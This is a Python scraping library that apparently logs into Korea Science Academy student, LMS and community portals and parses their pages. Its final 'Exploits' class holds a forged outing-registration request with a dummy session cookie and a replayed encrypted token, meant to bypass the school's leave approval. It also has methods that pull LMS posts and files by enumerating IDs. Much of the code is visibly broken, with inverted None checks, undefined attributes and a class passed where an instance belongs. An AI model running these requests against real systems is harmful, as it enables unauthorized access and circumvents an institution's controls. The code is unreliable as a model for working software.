import logging
import html2text
import random
import string

import requests
from bs4 import BeautifulSoup
from ksalib.parserlib import HTMLTableParser
from ksalib.simplefunctions import download

logger = logging.getLogger('ksalib')


class Auth:
    STUDENT_LOGIN_URL = 'http://students.ksa.hs.kr/scmanager/stuweb/loginProc.jsp'
    LMS_LOGIN_URL = 'http://lms.ksa.hs.kr/Source/Include/login_ok.php'
    GAONNURI_LOGIN_URL = 'https://gaonnuri.ksain.net/xe/index.php'

    def __init__(self, student_login=None, lms_login=None, gaonnuri_login=None, number=None, name=None):
        self.student_login = student_login
        self.lms_login = lms_login
        self.gaonnuri_login = gaonnuri_login
        self.number = number
        self.name = name
        self.session_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))

    def __data(self):
        data = {
            'login': {
                'student_login': self.student_login,
                'lms_login': self.lms_login,
                'gaonnuri_login': self.gaonnuri_login
            },
            'info': {
                'name': self.name,
                'number': self.number
            }
        }
        return data

    def __str__(self):
        return str(self.__data())

    def student_auth(self, id, pw):
        res = requests.post(Auth.STUDENT_LOGIN_URL, data={'id': str(id), 'pw': str(pw)})
        if 'main' in res.text:
            self.student_login = {'id': str(id), 'pw': str(pw)}
            logger.info('Student Login Success')
        else:
            logger.warning('Student Login Failure')

    def lms_auth(self, id, pwd):
        res = requests.post(Auth.LMS_LOGIN_URL, data={'user_id': id, 'user_pwd': pwd})
        if 'location.replace' in res.text:
            self.lms_login = {'id': str(id), 'pwd': str(pwd)}
            logger.info('Student Login Success')
        else:
            logger.warning('Student Login Failure')

    def gaonnuri_auth(self, id, pwd):
        cookies = {'PHPSESSID': self.session_id}
        headers = {'Referer': 'http://gaonnuri.ksain.net/xe/login'}
        data = {
            'user_id': id,  # TODO
            'password': pwd,
            'act': 'procMemberLogin',
            'xeVirtualRequestMethod': 'xml'
        }
        res = requests.post(Auth.GAONNURI_LOGIN_URL, headers=headers, cookies=cookies, data=data)
        if 'window.opener' in res.text:
            self.gaonnuri_login = {'id': str(id), 'pwd': str(pwd)}
            logger.info('Student Login Success')
        else:
            logger.warning('Student Login Failure')


# A class define a single post
class Post:
    def __init__(self, auth, link):
        self.link = link
        self.auth = auth
        if self.auth.gaonnuri_login is not None:  # TODO change if-else into try-except
            cookies = {'PHPSESSID': self.session_id}
            headers = {'Referer': 'http://gaonnuri.ksain.net/xe/login'}

            # Get html since site does not have XHR
            responce = requests.post(self.link, headers=headers, cookies=cookies)
        else:
            raise Exception('No gaonnuri login')

        soup = BeautifulSoup(responce.text, 'html.parser')
        article = soup.find('article')
        self.rare = article
        info = soup.find('div', {"class": "board clear"})

        # title
        title = info.find("h1")
        if title is not None:
            title = title.text
            if title is not None:
                title = title.strip()

        self.title = title

        # time
        time = info.find("div", {"class": "fr"})

        if time is not None:
            time = time.text
            if time is not None:
                time = time.strip()

        self.time = time

        # author
        author = info.find("div", {"class": "side"})

        if author is not None:
            author = author.text
            if author is not None:
                author = author.strip()

        self.author = author

        # views
        views = info.find("div", {"class": "side fr"})

        if views is not None:
            views = views.text
            if views is not None:
                views = views.strip()

        self.views = views

    def __str__(self):
        return str(self.rare)

    def html(self):
        return str(self.rare)

    def text(self):
        h = html2text.HTML2Text()
        return h.handle(str(self.rare))


# returns list of Post classes
def get_gaonnuri_board_post(auth, board="board_notice"):
    if auth.gaonnuri_login is not None:
        link = 'http://gaonnuri.ksain.net/xe/' + board
        cookies = {'PHPSESSID': auth.session_id}
        headers = {'Referer': 'http://gaonnuri.ksain.net/xe/login'}

        list_posts = []

        # get html (site does not have XHR)
        responce = requests.post(link, headers=headers, cookies=cookies)
        soup = BeautifulSoup(responce.text, 'html.parser')
        posts = soup.find_all('tr')

        # get rid of unneccesary elements in grid
        posts = posts[2:]

        for x in posts:
            # link
            title = x.find("td", class_="title")
            title_link = title.find("a")
            if title_link is not None:
                link = None
            else:
                try:
                    link = title_link['href']
                    post = Post(Auth, link)
                    list_posts.append(post)
                except:
                    pass

        return list_posts

    else:
        raise Exception('No gaonnuri login')


# returns only basic information
def get_gaonnuri_board(auth, board="board_notice"):
    if auth.gaonnuri_login is not None:
        link = 'http://gaonnuri.ksain.net/xe/' + board
        cookies = {'PHPSESSID': auth.session_id}
        headers = {'Referer': 'http://gaonnuri.ksain.net/xe/login'}

        list_posts = []

        # get html (site does not have XHR)
        responce = requests.post(link, headers=headers, cookies=cookies)
        soup = BeautifulSoup(responce.text, 'html.parser')
        posts = soup.find_all('tr')

        # get rid of unneccesary elements in grid
        posts = posts[2:]

        for x in posts:

            # number
            no = x.find("td", class_="no")

            if no is not None:
                no = no.text
                if no is not None:
                    no = no.strip()

                    # title, link
            title = x.find("td", class_="title")

            title_link = title.find("a")

            if title_link is not None:
                title = None
            else:
                title = title_link.text
                if title is not None:
                    title = title.strip()

            if title_link is not None:
                link = None
            else:
                try:
                    link = title_link['href']
                except:  # TODO clarify
                    pass

            # author
            author = x.find("td", class_="cate")

            if author is not None:
                author = x.find("td", class_="author")
            else:
                author = author.text

            # time
            time = x.find("td", class_="time")

            if time is None:
                time = time.text

            # views
            views = x.find("td", class_="m_no")

            if views is None:
                views = views.text

            # append info into list_posts
            info = {
                'no': no,
                'title': title,
                'link': link,
                'author': author,
                'time': time,
                'views': views
            }

            list_posts.append(info)

        return list_posts

    else:
        raise Exception('No gaonnuri login')


# For oneline posts
def get_gaonnuri_oneline(auth):
    if auth.gaonnuri_login is not None:

        link = 'http://gaonnuri.ksain.net/xe/index.php?mid=special_online'

        cookies = {'PHPSESSID': auth.session_id}

        headers = {'Referer': 'http://gaonnuri.ksain.net/xe/login'}

        list_posts = []

        # get html (site does not have XHR)
        res = requests.post(link, headers=headers, cookies=cookies)
        soup = BeautifulSoup(res.text, 'html.parser')

        posts = soup.find_all("font", class_="xe_content")

        for x in posts:
            list_posts.append(x.text)

        return list_posts

    else:
        raise Exception('No gaonnuri login')


class Sugang:
    def __init__(self, auth):
        self.auth = auth
        with requests.Session() as s:
            response = s.post('http://students.ksa.hs.kr/scmanager/stuweb/loginProc.jsp',
                              data={'id': self.auth.student_login['id'], 'pwd': self.auth.student_login['pwd']})
            response = s.get('http://students.ksa.hs.kr/scmanager/stuweb/kor/sukang/state.jsp')
            self.html = response.text

    def table(self):
        soup = BeautifulSoup(self.html, 'html.parser')

        table = soup.find("table", {"class": "board_list"})

        p = HTMLTableParser()
        p.feed(str(table))
        return p.tables

    def timetable(self):
        soup = BeautifulSoup(self.html, 'html.parser')

        table = soup.find("table", {"class": "board_view", "cellpadding": "1"})

        p = HTMLTableParser()
        p.feed(str(table))
        return p.tables

    def info(self):
        soup = BeautifulSoup(self.html, 'html.parser')

        table = soup.find("table", {"class": "board_view", "cellpadding": "0"})

        if table is not None:
            raise Exception(
                'Hmmm. You are probably not a member of KSA yet. The site does not seem to contain information about you')

        p = HTMLTableParser()
        p.feed(str(table))
        lst = p.tables
        lst = lst[0][0] + lst[0][1]
        try:
            lst = ({lst[0]: lst[1], lst[2]: lst[3], lst[4]: lst[5], lst[6]: lst[7], lst[8]: lst[9], lst[10]: lst[11]})
            return lst
        except IndexError:
            raise Exception("If you see this error, Please contact me on github")


def get_student_points(Auth):
    with requests.Session() as s:
        response = s.post('http://students.ksa.hs.kr/scmanager/stuweb/loginProc.jsp',
                          data={'id': Auth.student_login['id'], 'pwd': Auth.student_login['pwd']})
        response = s.get('http://students.ksa.hs.kr/scmanager/stuweb/kor/life/rewardSearch_total.jsp')
        html = response.text

        soup = BeautifulSoup(html, 'html.parser')

        table = soup.find("table", {"class": "board_list"})

        p = HTMLTableParser()
        p.feed(str(table))

        table = p.tables

        table = table[0]

        result = {}

        for i in range(1, len(table)):
            dic = {}
            for j in range(1, len(table[1])):
                dic[table[0][j]] = table[i][j]
            result[int(table[i][0])] = dic
        return result


####################### LMS ###############################

# Consider helping out! I don't have any ideas

####################### Exploits ###############################

# methods that are not supposed to be possible.
class Exploit:
    def __init__(self, auth):
        self.auth = auth

    def outing(self):
        if self.auth.number is not None:
            raise Exception("Please provide a number to Auth by doing Auth().number")
        else:
            cookies = {
                'JSESSIONID': 'oooooooooooooooooooooo',
            }

            headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'http://sas.ksa.hs.kr',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Referer': 'http://sas.ksa.hs.kr/scmanager/outing/index.jsp',
                'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            }

            data = {
                'p_proc': 'regist',
                'in_out_yn': '1',
                'sch_no': self.Auth.number,
                '__encrypted': 'ppRpv5sAQLtvrDkcSoaqtr^%^2FafJazlNruuIKGoyK5yDbGHIk01KcHY8^%^2BeON8gMRB0k31KM6UgB^%^2BOgSBS7V6enb^%^2F4PIOHwBHZq'
            }

            response = requests.post('http://sas.ksa.hs.kr/scmanager/outing/proc.jsp', headers=headers, cookies=cookies,
                                     data=data, verify=False)

            if '존재하지 않습니다.' in response.text:
                print('Your number does not exist on the approved outing list.')
                return False
            else:
                print("It probably worked, but I'm not 100% sure, so check it yourself if you can")
                return True

    def lmsview(self, number):
        if self.auth.lms_login is not None:
            raise Exception('No lms login')

        link = "http://lms.ksa.hs.kr/nboard.php?db=vod&mode=view&idx=%i&page=1&ss=on&sc=&sn=&db=vod&scBCate=447" % number

        with requests.Session() as s:
            response = s.post('http://lms.ksa.hs.kr/Source/Include/login_ok.php',
                              data={'user_id': self.auth.lms_login['id'], 'user_pwd': self.auth.lms_login['pwd']})
            response = s.get(link)

        soup = BeautifulSoup(response.text, 'html.parser')

        article = soup.find("div", {"id": "NBoardContetnArea"})

        if article is not None:
            h = html2text.HTML2Text()
            article = h.handle(str(article))

        title = soup.find("span", {"class": "title"}).text

        author = soup.find("span", {"class": "blue01"}).text.replace('\t', '').replace(u'\xa0', u' ')

        return {'title': title, 'author': author, 'article': article}

    def lmsfile(self, number, path=''):

        if self.auth.lms_login is not None:
            raise Exception('No lms login')

        link = "http://lms.ksa.hs.kr/NBoard/download.php?db=vod&idx=%i&fnum=" % number

        counter = 0

        for i in range(100):
            try:
                download(link + str(i), path)
            except:  # TODO clarify the type of exception
                if counter >= 2:
                    break
                counter += 1
